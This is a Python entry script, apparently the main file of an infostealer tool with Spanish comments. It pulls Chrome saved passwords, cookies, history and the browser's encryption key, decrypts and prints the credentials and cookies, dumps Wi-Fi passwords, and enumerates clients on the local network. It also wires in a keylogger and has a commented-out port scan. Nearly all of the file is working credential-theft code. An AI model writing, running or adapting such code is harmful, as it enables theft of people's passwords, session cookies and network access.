#!/usr/bin/env python3

from controller.FileSystemController    import FileSystemController
from controller.GoogleChromeController  import GoogleChromeController
from controller.LogController           import LogController
from controller.KeyloggerController     import KeyloggerController
from controller.NetworkController       import NetworkController
# from controller.UploaderController      import UploaderController

from colorama                           import init, Fore
import os

if __name__ == "__main__":

    # Colorama
    init()
    GREEN = Fore.GREEN
    RESET = Fore.RESET
    GRAY = Fore.LIGHTBLACK_EX

    log = LogController()

    # Files
    fs_controller   = FileSystemController()
    directorio_home = fs_controller.get_home_directory() 

    # Keylogger
    keylogger = KeyloggerController(interval=10)
    # keylogger.start()

    # Google Chrome
    google_controller      = GoogleChromeController()
    google_bookmarks       = google_controller.get_bookmarks()
    google_passwords       = google_controller.get_passwords()
    google_chrome_cookies  = google_controller.get_cookies()
    historial_de_descargas = google_controller.get_download_history()
    historial_de_busquedas = google_controller.get_search_history()
    clave_de_encriptacion  = google_controller.get_encryption_key()

    if historial_de_descargas:
        for fila in historial_de_descargas:
            # estos son los campos que importan target_path, start_time, tab_url sino referrer ejemplo print(fila['start_time'])
            pass
    else:
        log.error('')

    if historial_de_busquedas:
        for fila in historial_de_busquedas:
            # estos son los campos que importan term, url ejemplo print(fila['term'])
            pass
    else:
        log.error('')

    print(google_bookmarks)

    if google_chrome_cookies:
        for fila in google_chrome_cookies:
            try:
                cookie = google_controller.decrypt(fila['encrypted_value'], clave_de_encriptacion)
                print(f"""
                Host: {fila['host_key']}
                Cookie name: {fila['name']}
                Cookie value (decrypted): {cookie}
                Creation datetime (UTC): {google_controller.get_date(fila['creation_utc'])}
                Last access datetime (UTC): {google_controller.get_date(fila['last_access_utc'])}
                Expires datetime (UTC): {google_controller.get_date(fila['expires_utc'])}
                ===============================================================
                """)
            except Exception as excepcion:
                log.error(excepcion)
                continue
    else:
        log.error('')

    if google_passwords:
        for fila in google_passwords:
            try:
                password = google_controller.decrypt(fila['password_value'], clave_de_encriptacion)
                print(f"""
                Origin URL: {fila['origin_url']}
                Login URL: {fila['action_url']}
                Usuario: {fila['username_value']}
                Password: {password}
                ===============================================================
                """)
            except Exception as excepcion:
                log.error(excepcion)
                continue
    else:
        log.error('')


    # Network
    network_controller = NetworkController()
    wifi_passowrds     = network_controller.get_wifi_passwords()
    wifi_ssids         = network_controller.get_wifi_ssids()
    wifi_clients       = network_controller.get_wifi_clients('192.168.1.1/24')
    print(wifi_passowrds)
    print(wifi_ssids)

    if wifi_clients:
        for client in wifi_clients:
            print("{:16}    {}".format(client['ip'], client['mac']))

    # Escaneo de Puertos
    # https://thepythoncode.com/article/make-port-scanner-python
    # target_ip = '192.168.1.220'
    # for port in range(21, 80):
    #     if network_controller.is_port_open(target_ip, port):
    #         print(f"{GREEN}[+] {target_ip}:{port} is open      {RESET}")
    #     else:
    #         print(f"{GRAY}[!] {target_ip}:{port} is closed    {RESET}", end="\r")